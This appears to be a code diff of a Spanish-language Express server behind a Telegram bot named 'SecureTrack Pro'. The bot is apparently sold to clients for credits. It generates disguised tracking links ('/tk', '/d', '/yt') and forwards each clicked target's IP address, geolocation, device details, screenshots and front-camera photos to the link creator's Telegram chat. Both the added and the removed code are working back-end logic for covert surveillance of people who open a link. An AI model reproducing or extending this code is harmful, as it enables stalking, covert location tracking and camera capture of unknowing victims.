-                console.error("Error enviando ubicación nativa:", err);
-            }
-        }
-
-    } else {
-        console.error(`[❌ FALLO AL ENVIAR] A chat ${ownerChatId} | Respuesta:`, msgResult);
-    }
-    res.json({ success: true });
-});
-
-// Recibe la foto (screenshot) y cámara frontal (si hay) y las reenvía a Telegram
-app.post('/api/photo', upload.array('photos', 2), async (req, res) => {
-    const targetId = req.body.targetId || 'Desconocido';
     let ownerChatId = ADMIN_CHAT_ID;
 
-    if (targetId !== 'Desconocido') {
+    if (targetId !== 'Visitante Anónimo') {
         const { data: linkData } = await supabase.from('bot_links').select('chat_id').eq('target_id', targetId).single();
         if (linkData && linkData.chat_id) ownerChatId = linkData.chat_id;
     }
 
-    if (req.files && req.files.length > 0) {
-        try {
-            console.log(`[PHOTO] Recibidas ${req.files.length} imágenes de ${targetId}.`);
+    const g = data.geo || {};
+    const b = data.browser || {};
+    const con = data.connection || {};
+    const flag = getFlagEmoji(g.countryCode);
+    const ts = new Date().toLocaleString('es-ES');
 
-            if (req.files.length === 1) {
-                // Si solo llegó 1 foto (probablemente screenshot porque denegó cámara)
-                const formData = new FormData();
-                formData.append('chat_id', ownerChatId);
-                formData.append('caption', `📸 Captura del objetivo: ${targetId} — ${new Date().toLocaleString('es-ES')}`);
+    const messageHtml = `🎯 <b>OBJETIVO:</b> <code>${targetId}</code>\n👁️ <b>CARGA</b> — <code>${ts}</code>\n\n` +
+        `🌐 IP: <code>${g.ip}</code>\n` +
+        `${flag} País: ${g.country} (${g.city})\n` +
+        `📱 OS: ${b.os} | Nav: ${b.browser}\n` +
+        `📶 ISP: ${g.isp}`;
 
-                const blob = new Blob([req.files[0].buffer], { type: 'image/jpeg' });
-                formData.append('photo', blob, req.files[0].originalname || 'foto.jpg');
-
-                const tgRes = await fetch(`${BASE_URL}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                const tgJson = await tgRes.json();
-                if (!tgJson.ok) console.error(`[-] Telegram rechazó enviar foto singular:`, tgJson);
-            } else {
-                // Llegaron 2 fotos, enviar como grupo (MediaGroup)
-                const formData = new FormData();
-                formData.append('chat_id', ownerChatId);
-
-                const mediaGroup = [];
-                req.files.forEach((file, index) => {
-                    const attachName = `attach://photo${index}`;
-                    const blob = new Blob([file.buffer], { type: 'image/jpeg' });
-                    formData.append(`photo${index}`, blob, file.originalname);
-
-                    mediaGroup.push({
-                        type: 'photo',
-                        media: attachName,
-                        caption: index === 0 ? `📸 Captura Web + 📷 Cámara Frontal de: ${targetId}` : ''
-                    });
-                });
-
-                formData.append('media', JSON.stringify(mediaGroup));
-
-                const tgRes = await fetch(`${BASE_URL}/sendMediaGroup`, {
-                    method: 'POST',
-                    body: formData
-                });
-                const tgJson = await tgRes.json();
-                if (!tgJson.ok) console.error(`[-] Telegram rechazó el sendMediaGroup:`, tgJson);
-            }
-
-            console.log(`[+] Archivos multimedia procesados para ID: ${targetId}`);
-
-        } catch (e) {
-            console.error('[-] Error enviando fotos a tg:', e.message);
-        }
-    } else {
-        console.warn(`[-] /api/photo recibió solicitud sin archivos adjuntos para ID: ${targetId}`);
+    await sendMessage(ownerChatId, messageHtml);
+    if (g.lat && g.lon) {
+        await fetch(`${BASE_URL}/sendLocation`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: ownerChatId, latitude: parseFloat(g.lat), longitude: parseFloat(g.lon) })
+        });
     }
     res.json({ success: true });
 });
 
-// Endpoint temporal para debuggear errores de frontend
-app.post('/api/log', (req, res) => {
-    console.log(`[FRONTEND LOG]:`, req.body.message);
+app.post('/api/photo', upload.array('photos', 2), async (req, res) => {
+    const targetId = req.body.targetId || 'Desconocido';
+    let ownerChatId = ADMIN_CHAT_ID;
+    if (targetId !== 'Desconocido') {
+        const { data: linkData } = await supabase.from('bot_links').select('chat_id').eq('target_id', targetId).single();
+        if (linkData && linkData.chat_id) ownerChatId = linkData.chat_id;
+    }
+    if (req.files && req.files.length > 0) {
+        for (const file of req.files) {
+            const formData = new FormData();
+            formData.append('chat_id', ownerChatId);
+            formData.append('photo', new Blob([file.buffer], { type: 'image/jpeg' }), 'photo.jpg');
+            formData.append('caption', `📸 Captura: ${targetId}`);
+            await fetch(`${BASE_URL}/sendPhoto`, { method: 'POST', body: formData });
+        }
+    }
     res.json({ success: true });
 });
 
-
 /* ====================================================
-   POLLING LOOP (Comandos del Bot)
+   POLLING LOOP
    ==================================================== */
 async function poll() {
-    // ✅ Evitar polling duplicado
-    if (isPolling) {
-        setTimeout(poll, 500);
-        return;
-    }
-
+    if (isPolling) { setTimeout(poll, 500); return; }
     isPolling = true;
     try {
-        const data = await apiFetch('getUpdates', { offset, timeout: 15, allowed_updates: ['message'] });
-
-        // ✅ Detectar error de conflicto específico
-        if (data && data.description && data.description.includes('Conflict') && data.description.includes('getUpdates')) {
-            conflictCount++;
-            lastConflictTime = Date.now();
-
-            // Calcular tiempo de espera con backoff exponencial + jitter
-            const baseDelay = Math.min(1000 * Math.pow(2, conflictCount - 1), 30000); // Max 30s
-            const jitter = Math.random() * 5000; // 0-5s de variación
-            const waitTime = baseDelay + jitter;
-
-            console.error(`\n🔴 [CONFLICTO ${conflictCount}] Otra instancia está usando polling.`);
-            console.error(`⏳ Esperando ${Math.round(waitTime / 1000)}s antes de reintentar...`);
-            console.error(`💡 NOTA: Detén la otra instancia del bot para que esta pueda conectarse.\n`);
-
-            isPolling = false;
-            setTimeout(poll, waitTime);
-            return;
-        }
-
-        // Reiniciar contador si se conectó exitosamente
-        if (conflictCount > 0) {
-            console.log(`✅ Conflicto resuelto. Instancia anterior se ha desconectado.`);
-            conflictCount = 0;
-        }
-
+        const data = await apiFetch('getUpdates', { offset, timeout: 15 });
         if (data && data.result && data.result.length > 0) {
-            // Actualizamos el offset inmediatamente para evitar procesar los mismos mensajes otra vez
             offset = data.result[data.result.length - 1].update_id + 1;
-
             for (const update of data.result) {
-                if (update.message?.text) {
-                    await handleCommand(update.message);
-                }
+                if (update.message?.text) await handleCommand(update.message);
             }
         }
-    } catch (e) {
-        console.error('[POLL ERROR]', e.message);
-    } finally {
-        isPolling = false;
-        setTimeout(poll, 500);
-    }
+    } catch (e) { console.error('[POLL ERROR]', e.message); }
+    finally { isPolling = false; setTimeout(poll, 500); }
 }
 
-/* ====================================================
-   INICIO
-   ==================================================== */
 async function main() {
     const me = await apiFetch('getMe');
-    if (!me?.ok) {
-        console.error('❌ Error de conexión con Telegram.');
-        process.exit(1);
-    }
-
-    console.log(`\n📡 Limpiando webhooks antigos...`);
-    // ✅ Elimina cualquier webhook anterior para asegurar que solo polling está activo
-    const deleteWebhook = await apiFetch('deleteWebhook', { drop_pending_updates: true });
-    if (deleteWebhook?.ok) {
-        console.log(`✅ Webhooks limpiados\n`);
-    }
-
-    // ✅ Manejar terminación limpia
-    process.on('SIGINT', async () => {
-        console.log('\n\n🛑 Deteniendo bot...');
-        isPolling = true; // Detener el polling
-        try {
-            await sendMessage(ADMIN_CHAT_ID, `🔴 <b>SecureTrack Pro — Desconectado</b>`);
-        } catch (_) { }
-        process.exit(0);
-    });
-
-    // Iniciar Express Server
-    app.listen(PORT, () => {
-        console.log(`🌍 Servidor Web activo en puerto ${PORT}`);
-        console.log(`✅ Bot activo: @${me.result.username}`);
-        console.log(`🛑 Ctrl+C para detener\n`);
-    });
-
-    const initMsg = `🟢 <b>SISTEMA SECURETRACK EN LÍNEA</b> 🟢
-
-=========================
-🛡️ <b>Módulo Central:</b> Activo
-📡 <b>Conexión DB:</b> Supabase Connected
-⏱️ <b>Inicio:</b> ${new Date().toLocaleString('es-ES')}
-=========================
-
-¡Hola CEO! El servidor ha arrancado con éxito.
-
-📊 <b>Comandos Rápidos de Gestión:</b>
-👉 <b>/users</b> — Lista de clientes y créditos
-👉 <b>/adduser</b> — Agregar cliente
-👉 <b>/addcredits</b> — Modificar saldo
-👉 <b>/setplan</b> — Cambiar plan a VIP
-
-🔗 <b>Creación Rápida:</b> Use <code>/tk</code>, <code>/d</code>, o <code>/yt</code> para comenzar a generar rastreadores.`;
-
-    await sendMessage(ADMIN_CHAT_ID, initMsg);
+    if (!me?.ok) { console.error('❌ Error de conexión con Telegram.'); process.exit(1); }
+    await apiFetch('deleteWebhook', { drop_pending_updates: true });
+    app.listen(PORT, () => console.log(`🌍 Servidor activo en ${PORT} | Bot: @${me.result.username}`));
     poll();
 }
 
 main();
-
